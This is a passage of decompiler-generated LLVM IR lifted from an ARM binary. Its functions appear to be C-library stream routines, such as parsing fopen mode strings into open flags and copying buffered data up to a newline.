  %v9_15bd4 = icmp eq i32 %v0_15bd4, %v1_15bd4
  store i1 %v9_15bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15bd4, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_15bd4
  %v1_15bd8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15bd8, i32* %v1_15b80, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_15bd4, %bb43
  %v0_15bdc = load i32, i32* %r0.global-to-local, align 4
  %v1_15bdc = load i32, i32* %r5.global-to-local, align 4
  %v2_15bdc = sub i32 %v1_15bdc, %v0_15bdc
  store i32 %v2_15bdc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15ba0, %bb44
  %v0_15be0 = phi i32 [ %v0_15be0.pre, %dec_label_pc_15ba0 ], [ %v2_15bdc, %bb44 ]
  store i32 %v0_15be0, i32* %r0.global-to-local, align 4
  %v2_15be8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15be8, i32* %r4.global-to-local, align 4
  ret i32 %v0_15be0

; uselistorder directives
  uselistorder i32 %v0_15be0, { 1, 0 }
  uselistorder i32 %v1_15bc8, { 1, 0 }
  uselistorder i32 %v2_15bc4, { 0, 2, 1 }
  uselistorder i32 %v1_15b94, { 1, 0 }
  uselistorder i32 %v2_15b8c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15bb828, { 1, 0 }
  uselistorder i32 %v2_15b4c1, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 5, 1, 4, 6, 2, 0, 3 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 5, 2, 3, 4, 0, 6, 9, 7, 8 }
  uselistorder i32 127, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15be0, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_15bd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b8c, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @function_15bf0(i16* %arg1) local_unnamed_addr {
dec_label_pc_15bf0:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15bf0 = load i32, i32* @r4, align 4
  store i32 %v3_15bf0, i32* %stack_var_-36, align 4
  %v6_15bf0 = load i32, i32* @r5, align 4
  %v9_15bf0 = load i32, i32* @r6, align 4
  %v12_15bf0 = load i32, i32* @r7, align 4
  %v2_15bf4 = add i32 %tmp, 52
  %v3_15bf4 = inttoptr i32 %v2_15bf4 to i32*
  %v4_15bf4 = load i32, i32* %v3_15bf4, align 4
  %v1_15bfc = sub i32 1, %v4_15bf4
  %v2_15bfc = icmp ult i32 %v4_15bf4, 2
  br i1 %v2_15bfc, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_15bf0
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15bf0, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_15bfc, %dec_label_pc_15bf0 ]
  %v0_15c04 = phi i32 [ 0, %bb ], [ %v1_15bfc, %dec_label_pc_15bf0 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_15c04 = icmp eq i32 %v0_15c04, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 144312, i32* @r6, align 4
  br i1 %v2_15c04, label %dec_label_pc_15c50, label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %bb18
  %v4_15c30 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_15c30)
  %v0_15c44 = load i32, i32* @r6, align 4
  %v2_15c44 = add i32 %v0_15c44, 20
  %v3_15c44 = inttoptr i32 %v2_15c44 to i32*
  %v4_15c44 = load i32, i32* %v3_15c44, align 4
  call void @__pseudo_branch(i32 %v4_15c44)
  %v0_15c50.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c50

dec_label_pc_15c50:                               ; preds = %bb18, %dec_label_pc_15c18
  %v1_15c58 = phi i32 [ %tmp, %bb18 ], [ %v0_15c50.pre, %dec_label_pc_15c18 ]
  %v1_15c50 = inttoptr i32 %v1_15c58 to i16*
  %v2_15c50 = load i16, i16* %v1_15c50, align 2
  %v3_15c50 = zext i16 %v2_15c50 to i32
  %v1_15c54 = and i32 %v3_15c50, 64
  %v2_15c54 = icmp eq i32 %v1_15c54, 0
  br i1 %v2_15c54, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_15c50
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15c50, %bb19
  %storemerge26 = phi i32 [ %v1_15c58, %bb19 ], [ %v1_15c54, %dec_label_pc_15c50 ]
  %v1_15c5c = xor i1 %v2_15c54, true
  call void @__pseudo_cond_branch(i1 %v1_15c5c, i32 ptrtoint (i32* @global_var_1709c.443 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_15c64 = load i32, i32* @r5, align 4
  %v1_15c64 = add i32 %v0_15c64, 4
  %v2_15c64 = inttoptr i32 %v1_15c64 to i32*
  %v3_15c64 = load i32, i32* %v2_15c64, align 4
  %v1_15c68 = call i32 @function_108d0(i32 %v3_15c64)
  %v0_15c70 = load i32, i32* @r6, align 4
  %v2_15c7c = add i32 %v0_15c70, 112
  %v3_15c7c = inttoptr i32 %v2_15c7c to i32*
  %v4_15c7c = load i32, i32* %v3_15c7c, align 4
  store i32 %v4_15c7c, i32* @r7, align 4
  %v1_15c84 = load i32, i32* @r5, align 4
  %v2_15c84 = add i32 %v1_15c84, 4
  %v3_15c84 = inttoptr i32 %v2_15c84 to i32*
  store i32 -1, i32* %v3_15c84, align 4
  %v0_15c8c = load i32, i32* @r6, align 4
  %v2_15c8c = add i32 %v0_15c8c, 76
  %v3_15c8c = inttoptr i32 %v2_15c8c to i32*
  %v4_15c8c = load i32, i32* %v3_15c8c, align 4
  %v1_15c94 = icmp slt i32 %v1_15c68, 0
  store i32 %v4_15c8c, i32* %stack_var_-80, align 4
  br i1 %v1_15c94, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_15c8c)
  %v0_15cbc = load i32, i32* @r6, align 4
  %v2_15cbc = add i32 %v0_15cbc, 20
  %v3_15cbc = inttoptr i32 %v2_15cbc to i32*
  %v4_15cbc = load i32, i32* %v3_15cbc, align 4
  call void @__pseudo_branch(i32 %v4_15cbc)
  %v0_15ccc = load i32, i32* @r6, align 4
  %v2_15ccc = add i32 %v0_15ccc, 12
  %v3_15ccc = inttoptr i32 %v2_15ccc to i32*
  %v4_15ccc = load i32, i32* %v3_15ccc, align 4
  %v1_15cd0 = inttoptr i32 %v4_15ccc to i32*
  %v2_15cd0 = load i32, i32* %v1_15cd0, align 4
  %v1_15cd8 = add i32 %v2_15cd0, 1
  %v2_15cdc = add i32 %v0_15ccc, 28
  %v3_15cdc = inttoptr i32 %v2_15cdc to i32*
  %v4_15cdc = load i32, i32* %v3_15cdc, align 4
  store i32 %v4_15cdc, i32* @r4, align 4
  store i32 %v1_15cd8, i32* %v1_15cd0, align 4
  call void @__pseudo_branch(i32 %v4_15cdc)
  %v0_15cf4 = load i32, i32* @r5, align 4
  %v1_15cf4 = inttoptr i32 %v0_15cf4 to i16*
  %v2_15cf4 = load i16, i16* %v1_15cf4, align 2
  %v1_15cf8 = and i16 %v2_15cf4, 24576
  %v1_15cfc = or i16 %v1_15cf8, 48
  %v0_15d00 = load i32, i32* %sb.global-to-local, align 4
  %v2_15d00 = icmp eq i32 %v0_15d00, 0
  store i16 %v1_15cfc, i16* %v1_15cf4, align 2
  br i1 %v2_15d00, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_15d14 = xor i1 %v2_15d00, true
  call void @__pseudo_cond_branch(i1 %v2_15d14, i32 %v4_15cdc)
  %v0_15d18 = load i32, i32* @r5, align 4
  %v1_15d18 = inttoptr i32 %v0_15d18 to i16*
  %v2_15d18 = load i16, i16* %v1_15d18, align 2
  %v1_15d1c = and i16 %v2_15d18, 16384
  %v2_15d1c = icmp eq i16 %v1_15d1c, 0
  br i1 %v2_15d1c, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_15d24 = xor i1 %v2_15d1c, true
  call void @__pseudo_cond_branch(i1 %v1_15d24, i32 ptrtoint (i32* @global_var_13684.435 to i32))
  %v2_15d30 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_15d30)
  call void @__pseudo_branch(i32 %v4_15cbc)
  %v0_15d50 = load i32, i32* @r6, align 4
  %v2_15d50 = add i32 %v0_15d50, 52
  %v3_15d50 = inttoptr i32 %v2_15d50 to i32*
  %v4_15d50 = load i32, i32* %v3_15d50, align 4
  %v1_15d54 = inttoptr i32 %v4_15d50 to i32*
  %v2_15d54 = load i32, i32* %v1_15d54, align 4
  %v1_15d58 = add i32 %v2_15d54, 1
  store i32 %v1_15d58, i32* %v1_15d54, align 4
  call void @__pseudo_branch(i32 %v4_15cdc)
  %v0_15d70 = call i32 @function_16f14()
  %v0_15d74 = load i32, i32* %sl.global-to-local, align 4
  %v2_15d7c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15d7c, i32* @r4, align 4
  store i32 %v6_15bf0, i32* @r5, align 4
  store i32 %v9_15bf0, i32* @r6, align 4
  store i32 %v12_15bf0, i32* @r7, align 4
  ret i32 %v0_15d74

; uselistorder directives
  uselistorder i1 %v2_15d1c, { 1, 0 }
  uselistorder i32 %v4_15cdc, { 0, 2, 1, 3 }
  uselistorder i32 %v4_15bf4, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32 (i32)* @function_108d0, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_15c50, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_15d88(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d88:
  %v0_15d88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d88, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_15d88
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15d88, %bb
  %v10_15da0 = phi i32 [ %arg1, %dec_label_pc_15d88 ], [ 0, %bb ]
  ret i32 %v10_15da0

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_15da4() local_unnamed_addr {
dec_label_pc_15da4:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_15db4 = call i32 @function_15e78()
  ret i32 %v0_15db4
}

define i32 @function_15dc4(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15dc4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15dc4 = load i32, i32* @r4, align 4
  store i32 %v3_15dc4, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_15ddc2 = icmp eq i32 %arg3, 0
  store i1 %v2_15ddc2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ddc2, label %dec_label_pc_15e6c, label %dec_label_pc_15de4

dec_label_pc_15ddcthread-pre-split:               ; preds = %dec_label_pc_15de4
  %v3_15dfc = load i32, i32* %r6.global-to-local, align 4
  %v5_15dfc = add i32 %v3_15dfc, %v3_15df4
  store i32 %v5_15dfc, i32* %r6.global-to-local, align 4
  %v4_15e00 = load i32, i32* %r5.global-to-local, align 4
  %v5_15e00 = sub i32 %v4_15e00, %v3_15df4
  store i32 %v5_15e00, i32* %r5.global-to-local, align 4
  %v2_15ddc = icmp eq i32 %v5_15e00, 0
  store i1 %v2_15ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ddc, label %dec_label_pc_15ddc.dec_label_pc_15e6c.loopexit_crit_edge, label %dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge

dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge: ; preds = %dec_label_pc_15ddcthread-pre-split
  %v3_15de4.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_15df0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15de4

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15dc4, %dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge
  %v0_15df0 = phi i32 [ %v0_15df0.pre, %dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge ], [ %tmp, %dec_label_pc_15dc4 ]
  %v0_15dec = phi i32 [ %v5_15dfc, %dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge ], [ %arg2, %dec_label_pc_15dc4 ]
  %v3_15de4 = phi i32 [ %v3_15de4.pre, %dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge ], [ 2147483647, %dec_label_pc_15dc4 ]
  %v0_15de8.in = phi i32 [ %v5_15e00, %dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge ], [ %arg3, %dec_label_pc_15dc4 ]
  %v3_15de8 = phi i32 [ %v5_15e00, %dec_label_pc_15ddcthread-pre-split.dec_label_pc_15de4_crit_edge ], [ %arg3, %dec_label_pc_15dc4 ]
  %v0_15de8 = icmp slt i32 %v0_15de8.in, 0
  %storemerge = select i1 %v0_15de8, i32 %v3_15de4, i32 %v3_15de8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_15dec, i32* %r1.global-to-local, align 4
  %v1_15df0 = add i32 %v0_15df0, 4
  %v2_15df0 = inttoptr i32 %v1_15df0 to i32*
  %v3_15df0 = load i32, i32* %v2_15df0, align 4
  %v3_15df4 = call i32 @function_107b0(i32 %v3_15df0, i32 %v0_15dec)
  %v1_15df8 = icmp slt i32 %v3_15df4, 0
  %v2_15df8 = icmp eq i32 %v3_15df4, 0
  store i1 %v2_15df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_15df8, label %dec_label_pc_15e08, label %dec_label_pc_15ddcthread-pre-split

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15de4
  %v0_15e08 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e08 = inttoptr i32 %v0_15e08 to i16*
  %v2_15e08 = load i16, i16* %v1_15e08, align 2
  %v3_15e08 = zext i16 %v2_15e08 to i32
  store i32 %v3_15e08, i32* %r3.global-to-local, align 4
  %v1_15e0c = add i32 %v0_15e08, 8
  store i32 %v1_15e0c, i32* %r1.global-to-local, align 4
  %v1_15e10 = inttoptr i32 %v1_15e0c to i32*
  %v2_15e10 = load i32, i32* %v1_15e10, align 4
  store i32 %v2_15e10, i32* %r1.global-to-local, align 4
  %v3_15e10 = add i32 %v0_15e08, 12
  %v4_15e10 = inttoptr i32 %v3_15e10 to i32*
  %v5_15e10 = load i32, i32* %v4_15e10, align 4
  %v1_15e14 = or i32 %v3_15e08, 8
  store i32 %v1_15e14, i32* %r3.global-to-local, align 4
  %v2_15e18 = sub i32 %v5_15e10, %v2_15e10
  store i32 %v2_15e18, i32* @r2, align 4
  %v9_15e18 = icmp eq i32 %v5_15e10, %v2_15e10
  store i1 %v9_15e18, i1* %cpsr_z.global-to-local, align 1
  %v1_15e1c = trunc i32 %v1_15e14 to i16
  store i16 %v1_15e1c, i16* %v1_15e08, align 2
  br i1 %v9_15e18, label %dec_label_pc_15e08.dec_label_pc_15e68_crit_edge, label %dec_label_pc_15e24

dec_label_pc_15e08.dec_label_pc_15e68_crit_edge:  ; preds = %dec_label_pc_15e08
  %v0_15e68.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15e68

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15e08
  %v0_15e24 = load i32, i32* @r2, align 4
  %v1_15e24 = load i32, i32* %r5.global-to-local, align 4
  %v3_15e24 = icmp ult i32 %v0_15e24, %v1_15e24
  %v9_15e24 = icmp eq i32 %v0_15e24, %v1_15e24
  store i1 %v9_15e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e24, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_15e24
  store i32 %v1_15e24, i32* @r2, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_15e24, %bb23
  %v2_15e38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_15e4c
  %v2_15e38 = phi i32 [ %v2_15e38.pre, %.preheader ], [ %v1_15e50, %dec_label_pc_15e4c ]
  %v0_15e2c = load i32, i32* %r6.global-to-local, align 4
  %v1_15e2c = inttoptr i32 %v0_15e2c to i8*
  %v2_15e2c = load i8, i8* %v1_15e2c, align 1
  %v3_15e2c = zext i8 %v2_15e2c to i32
  store i32 %v3_15e2c, i32* %r3.global-to-local, align 4
  %v7_15e30 = icmp eq i8 %v2_15e2c, 10
  store i1 %v7_15e30, i1* %cpsr_z.global-to-local, align 1
  %v1_15e34 = add i32 %v0_15e2c, 1
  store i32 %v1_15e34, i32* %r6.global-to-local, align 4
  %v3_15e38 = inttoptr i32 %v2_15e38 to i8*
  store i8 %v2_15e2c, i8* %v3_15e38, align 1
  %v0_15e3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e3c, label %dec_label_pc_15e40, label %dec_label_pc_15e4c

dec_label_pc_15e40:                               ; preds = %bb24
  %v0_15e40 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e40 = inttoptr i32 %v0_15e40 to i16*
  %v2_15e40 = load i16, i16* %v1_15e40, align 2
  %v3_15e40 = zext i16 %v2_15e40 to i32
  store i32 %v3_15e40, i32* %r3.global-to-local, align 4
  %v1_15e44 = and i32 %v3_15e40, 256
  %v2_15e44 = icmp eq i32 %v1_15e44, 0
  store i1 %v2_15e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e44, label %dec_label_pc_15e4c, label %dec_label_pc_15e40.dec_label_pc_15e58_crit_edge

dec_label_pc_15e40.dec_label_pc_15e58_crit_edge:  ; preds = %dec_label_pc_15e40
  %v0_15e5c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e58

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e40, %bb24
  %v0_15e4c = load i32, i32* @r2, align 4
  %v1_15e4c = add i32 %v0_15e4c, -1
  store i32 %v1_15e4c, i32* @r2, align 4
  %v7_15e4c = icmp eq i32 %v0_15e4c, 1
  store i1 %v7_15e4c, i1* %cpsr_z.global-to-local, align 1
  %v0_15e50 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e50 = add i32 %v0_15e50, 1
  store i32 %v1_15e50, i32* %r1.global-to-local, align 4
  br i1 %v7_15e4c, label %dec_label_pc_15e4c.dec_label_pc_15e58_crit_edge, label %bb24

dec_label_pc_15e4c.dec_label_pc_15e58_crit_edge:  ; preds = %dec_label_pc_15e4c
  %v0_15e58.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e58

dec_label_pc_15e58:                               ; preds = %dec_label_pc_15e40.dec_label_pc_15e58_crit_edge, %dec_label_pc_15e4c.dec_label_pc_15e58_crit_edge
  %v0_15e5c = phi i32 [ %v1_15e50, %dec_label_pc_15e4c.dec_label_pc_15e58_crit_edge ], [ %v0_15e5c.pre, %dec_label_pc_15e40.dec_label_pc_15e58_crit_edge ]
  %v0_15e58 = phi i32 [ %v0_15e58.pre, %dec_label_pc_15e4c.dec_label_pc_15e58_crit_edge ], [ %v0_15e40, %dec_label_pc_15e40.dec_label_pc_15e58_crit_edge ]
  %v1_15e58 = add i32 %v0_15e58, 8
  %v2_15e58 = inttoptr i32 %v1_15e58 to i32*
  %v3_15e58 = load i32, i32* %v2_15e58, align 4
  store i32 %v3_15e58, i32* %r3.global-to-local, align 4
  %v2_15e5c = add i32 %v0_15e58, 16
  %v3_15e5c = inttoptr i32 %v2_15e5c to i32*
  store i32 %v0_15e5c, i32* %v3_15e5c, align 4
  %v0_15e60 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e60 = load i32, i32* %r1.global-to-local, align 4
  %v2_15e60 = sub i32 %v1_15e60, %v0_15e60
  store i32 %v2_15e60, i32* %r3.global-to-local, align 4
  %v1_15e64 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e64 = sub i32 %v1_15e64, %v2_15e60
  store i32 %v2_15e64, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15e68

dec_label_pc_15e68:                               ; preds = %dec_label_pc_15e08.dec_label_pc_15e68_crit_edge, %dec_label_pc_15e58
  %v0_15e68 = phi i32 [ %v0_15e68.pre, %dec_label_pc_15e08.dec_label_pc_15e68_crit_edge ], [ %v2_15e64, %dec_label_pc_15e58 ]
  %v1_15e68 = load i32, i32* @r7, align 4
  %v2_15e68 = sub i32 %v1_15e68, %v0_15e68
  br label %dec_label_pc_15e6c

dec_label_pc_15ddc.dec_label_pc_15e6c.loopexit_crit_edge: ; preds = %dec_label_pc_15ddcthread-pre-split
  %v0_15e6c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15e6c

dec_label_pc_15e6c:                               ; preds = %dec_label_pc_15dc4, %dec_label_pc_15ddc.dec_label_pc_15e6c.loopexit_crit_edge, %dec_label_pc_15e68
  %v0_15e6c = phi i32 [ %v2_15e68, %dec_label_pc_15e68 ], [ %v0_15e6c.pre.pre, %dec_label_pc_15ddc.dec_label_pc_15e6c.loopexit_crit_edge ], [ 0, %dec_label_pc_15dc4 ]
  %v2_15e70 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15e70, i32* %r4.global-to-local, align 4
  ret i32 %v0_15e6c

; uselistorder directives
  uselistorder i32 %v0_15e58, { 1, 0 }
  uselistorder i32 %v1_15e50, { 0, 2, 1 }
  uselistorder i32 %v0_15e4c, { 1, 0 }
  uselistorder i32 %v1_15e24, { 0, 2, 1 }
  uselistorder i32 %v0_15e24, { 1, 0 }
  uselistorder i32 %v5_15e10, { 1, 0 }
  uselistorder i32 %v2_15e10, { 1, 0, 2 }
  uselistorder i32 %v3_15df4, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15dec, { 1, 0 }
  uselistorder i32 %v5_15e00, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 3, 2, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @function_107b0, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15e6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15e68, { 1, 0 }
  uselistorder label %dec_label_pc_15e58, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15de4, { 1, 0 }
}

define i32 @function_15e78() local_unnamed_addr {
dec_label_pc_15e78:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15e78 = load i32, i32* @r4, align 4
  store i32 %v3_15e78, i32* %stack_var_-36, align 4
  %v6_15e78 = load i32, i32* @r5, align 4
  %v9_15e78 = load i32, i32* @r6, align 4
  %v18_15e78 = load i32, i32* @sb, align 4
  %v24_15e78 = load i32, i32* @fp, align 4
  %v0_15e7c = load i32, i32* @r1, align 4
  %v1_15e7c = inttoptr i32 %v0_15e7c to i8*
  %v2_15e7c = load i8, i8* %v1_15e7c, align 1
  %v3_15e7c = zext i8 %v2_15e7c to i32
  store i32 %v3_15e7c, i32* @ip, align 4
  %v7_15e84 = icmp eq i8 %v2_15e7c, 114
  store i32 144312, i32* @fp, align 4
  %v2_15e8c = ptrtoint i32* %stack_var_-72 to i32
  %v0_15e90 = load i32, i32* @r0, align 4
  store i32 %v0_15e90, i32* @r6, align 4
  %v0_15e94 = load i32, i32* @r2, align 4
  store i32 %v0_15e94, i32* @sb, align 4
  %v0_15e98 = load i32, i32* @r3, align 4
  store i32 %v0_15e98, i32* @r5, align 4
  br i1 %v7_15e84, label %dec_label_pc_15ee4, label %dec_label_pc_15ea0

dec_label_pc_15ea0:                               ; preds = %dec_label_pc_15e78
  %v7_15ea0 = icmp eq i8 %v2_15e7c, 119
  br i1 %v7_15ea0, label %bb, label %dec_label_pc_15eac

bb:                                               ; preds = %dec_label_pc_15ea0
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15eac:                               ; preds = %dec_label_pc_15ea0
  %v7_15eac = icmp eq i8 %v2_15e7c, 97
  br i1 %v7_15eac, label %bb32, label %dec_label_pc_15eb8

bb32:                                             ; preds = %dec_label_pc_15eac
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15eac, %dec_label_pc_15f6c, %dec_label_pc_15f40
  %v0_15eb8 = call i32 @function_1095c()
  store i32 %v0_15eb8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_15ec0 = load i32, i32* @sb, align 4
  %v2_15ec0 = icmp eq i32 %v0_15ec0, 0
  %v2_15ec4 = inttoptr i32 %v0_15eb8 to i32*
  store i32 22, i32* %v2_15ec4, align 4
  br i1 %v2_15ec0, label %dec_label_pc_16138, label %dec_label_pc_15ecc

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15f90._crit_edge, %dec_label_pc_15eb8
  %v0_15ecc = load i32, i32* @sb, align 4
  %v1_15ecc = inttoptr i32 %v0_15ecc to i16*
  %v2_15ecc = load i16, i16* %v1_15ecc, align 2
  %v3_15ecc = zext i16 %v2_15ecc to i32
  store i32 %v3_15ecc, i32* %r3.global-to-local, align 4
  %v1_15ed0 = and i32 %v3_15ecc, 8192
  %v2_15ed0 = icmp eq i32 %v1_15ed0, 0
  br i1 %v2_15ed0, label %dec_label_pc_16138, label %dec_label_pc_15ed8

dec_label_pc_15ed8:                               ; preds = %dec_label_pc_15ecc
  store i32 %v0_15ecc, i32* @r0, align 4
  %v0_15edc = call i32 @function_13684()
  store i32 %v0_15edc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16138

dec_label_pc_15ee4:                               ; preds = %dec_label_pc_15e78
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15ee8:                               ; preds = %bb, %bb32, %dec_label_pc_15ee4
  %v1_15f00 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_15ee4 ]
  %v1_15ee8 = add i32 %v0_15e7c, 1
  %v2_15ee8 = inttoptr i32 %v1_15ee8 to i8*
  %v3_15ee8 = load i8, i8* %v2_15ee8, align 1
  %v7_15eec = icmp eq i8 %v3_15ee8, 98
  %v1_15ee8.v0_15e7c = select i1 %v7_15eec, i32 %v1_15ee8, i32 %v0_15e7c
  store i32 %v1_15ee8.v0_15e7c, i32* %r3.global-to-local, align 4
  %v1_15ef8 = add i32 %v1_15ee8.v0_15e7c, 1
  %v2_15ef8 = inttoptr i32 %v1_15ef8 to i8*
  %v3_15ef8 = load i8, i8* %v2_15ef8, align 1
  %v4_15ef8 = zext i8 %v3_15ef8 to i32
  store i32 %v4_15ef8, i32* @r3, align 4
  %v7_15efc = icmp eq i8 %v3_15ef8, 43
  br i1 %v7_15efc, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_15ee8
  store i32 %v1_15f00, i32* @r3, align 4
  %v2_15f04 = add nuw nsw i32 %v1_15f00, 1
  store i32 %v2_15f04, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15ee8, %bb35
  %v2_15f08 = icmp eq i32 %v0_15e94, 0
